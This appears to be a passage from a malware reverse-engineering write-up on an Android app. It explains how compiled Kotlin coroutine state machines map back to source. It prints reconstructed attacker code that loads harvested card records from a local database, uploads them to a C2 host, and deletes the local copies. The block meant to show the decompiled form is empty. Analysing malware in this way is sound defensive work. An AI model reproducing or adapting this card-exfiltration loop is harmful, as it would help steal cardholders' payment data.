## Coroutine state machine restoration

Each `suspend fun` got rewritten by the Kotlin compiler into a class extending `kotlin.coroutines.jvm.internal.ContinuationImpl` (jadx shows this as `Q1.g`). The class has:

- A `k()` method containing one big `switch (label)` block — this is the suspend function body, sliced by suspend points
- Fields `f96f`, `g`, `h`, etc. — these are the local variables that need to survive across suspend points (saved to the heap so the continuation can resume)
- A `b(O1.d, Object)` method — `create()`, used by `coroutineScope`
- An `e(Object, Object)` method — `invoke()`, used by `launch { ... }`

In the operator's source these all collapse back into a clean Kotlin `suspend fun`:

```kotlin
// What the operator wrote
suspend fun run() {
    while (true) {
        val apiKey = dbHelper.getApiKey() ?: "no-key"
        val records = dbHelper.loadAllCards()
        for ((id, record) in records) {
            val json = buildUploadJson(record)
            val response = Reporter.uploadHarvestData(json, apiKey, C2_HOST)
            if ("Success" in response) {
                dbHelper.deleteCardAndItsTransactions(id)
                dbHelper.incrementScanCount()
                withContext(Dispatchers.Main) { onUploadSuccess() }
            }
        }
        delay(10_000)
    }
}
```

vs what R8 emitted:

```java
// What's in B2/s.java
```

Same semantics, vastly less readable. The `operator_view/` files restore the readable form.
